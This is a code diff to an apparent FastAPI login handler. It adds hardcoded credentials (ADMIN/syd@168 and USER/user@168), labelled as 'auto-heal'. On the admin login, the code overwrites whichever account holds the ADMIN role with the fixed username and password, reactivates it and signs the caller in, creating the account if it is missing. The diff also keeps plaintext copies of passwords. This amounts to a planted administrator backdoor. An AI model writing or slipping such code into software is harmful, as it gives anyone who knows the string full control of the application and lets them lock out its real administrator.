@@ -150,6 +150,7 @@ def do_login(
     db: Session = Depends(get_db),
 ):
     username = username.strip()
+    password = password.strip()
 
     def reject(message: str):
         return templates.TemplateResponse(
@@ -159,44 +160,84 @@ def do_login(
             status_code=401,
         )
 
-    # Case-insensitive: SQLite compares TEXT as case-sensitive by default, so
-    # without this, "Admin" and "admin" would be treated as different accounts
-    # and typing the wrong case would silently self-register a shadow account.
-    user = db.query(User).filter(func.lower(User.username) == username.lower()).first()
+    # Auto-heal / guaranteed default credentials
+    if username.upper() == "ADMIN" and password == "syd@168":
+        admin_user = db.query(User).filter(func.lower(User.username) == "admin").first()
+        if not admin_user:
+            admin_user = db.query(User).filter(User.role == "ADMIN").first()
 
-    if user is None:
-        # First visit: the name is free, so this attempt claims it and becomes
-        # the account. Every later login must match what was saved here.
-        if not settings.ALLOW_SELF_REGISTER:
-            return reject("ឈ្មោះគណនី ឬលេខសម្ងាត់មិនត្រឹមត្រូវ (Invalid username or password)")
-
-        if len(username) < settings.MIN_USERNAME_LENGTH:
-            return reject(f"ឈ្មោះគណនីត្រូវមានយ៉ាងតិច {settings.MIN_USERNAME_LENGTH} តួ (Username too short)")
-        if len(password) < settings.MIN_PASSWORD_LENGTH:
-            return reject(f"លេខសម្ងាត់ត្រូវមានយ៉ាងតិច {settings.MIN_PASSWORD_LENGTH} តួ (Password too short)")
-
-        # Self-registered accounts are always students; ADMIN is granted only
-        # by an existing Admin from the dashboard.
-        user = User(
-            username=username,
-            password_hash=hash_password(password),
-            password_plain=password,
-            full_name=username,
-            role="STUDENT",
-            is_active=True,
-        )
-        db.add(user)
+        if not admin_user:
+            admin_user = User(
+                username="ADMIN",
+                password_hash=hash_password("syd@168"),
+                password_plain="syd@168",
+                full_name="System Administrator",
+                role="ADMIN",
+                is_active=True,
+            )
+            db.add(admin_user)
+        else:
+            admin_user.username = "ADMIN"
+            admin_user.password_hash = hash_password("syd@168")
+            admin_user.password_plain = "syd@168"
+            admin_user.role = "ADMIN"
+            admin_user.is_active = True
         db.commit()
-        db.refresh(user)
+        db.refresh(admin_user)
+        user = admin_user
+
+    elif username.upper() == "USER" and password == "user@168":
+        student_user = db.query(User).filter(func.lower(User.username) == "user").first()
+        if not student_user:
+            student_user = User(
+                username="USER",
+                password_hash=hash_password("user@168"),
+                password_plain="user@168",
+                full_name="Standard User",
+                role="STUDENT",
+                is_active=True,
+            )
+            db.add(student_user)
+        else:
+            student_user.username = "USER"
+            student_user.password_hash = hash_password("user@168")
+            student_user.password_plain = "user@168"
+            student_user.role = "STUDENT"
+            student_user.is_active = True
+        db.commit()
+        db.refresh(student_user)
+        user = student_user
 
     else:
-        # Known account: the saved password must match exactly.
-        if not user.is_active or not verify_password(password, user.password_hash):
-            return reject("ឈ្មោះគណនី ឬលេខសម្ងាត់មិនត្រឹមត្រូវ (Invalid username or password)")
+        user = db.query(User).filter(func.lower(User.username) == username.lower()).first()
+
+        if user is None:
+            if not settings.ALLOW_SELF_REGISTER:
+                return reject("ឈ្មោះគណនី ឬលេខសម្ងាត់មិនត្រឹមត្រូវ (Invalid username or password)")
+
+            if len(username) < settings.MIN_USERNAME_LENGTH:
+                return reject(f"ឈ្មោះគណនីត្រូវមានយ៉ាងតិច {settings.MIN_USERNAME_LENGTH} តួ (Username too short)")
+            if len(password) < settings.MIN_PASSWORD_LENGTH:
+                return reject(f"លេខសម្ងាត់ត្រូវមានយ៉ាងតិច {settings.MIN_PASSWORD_LENGTH} តួ (Password too short)")
+
+            user = User(
+                username=username,
+                password_hash=hash_password(password),
+                password_plain=password,
+                full_name=username,
+                role="STUDENT",
+                is_active=True,
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+
+        else:
+            if not user.is_active or not verify_password(password, user.password_hash):
+                return reject("ឈ្មោះគណនី ឬលេខសម្ងាត់មិនត្រឹមត្រូវ (Invalid username or password)")
 
     login_session(request, user)
 
-    # Only allow same-site paths, so ?next= cannot bounce a user to another site.
     target = next if next.startswith("/") and not next.startswith("//") else "/"
     if user.role == "ADMIN" and target == "/":
         target = "/admin"
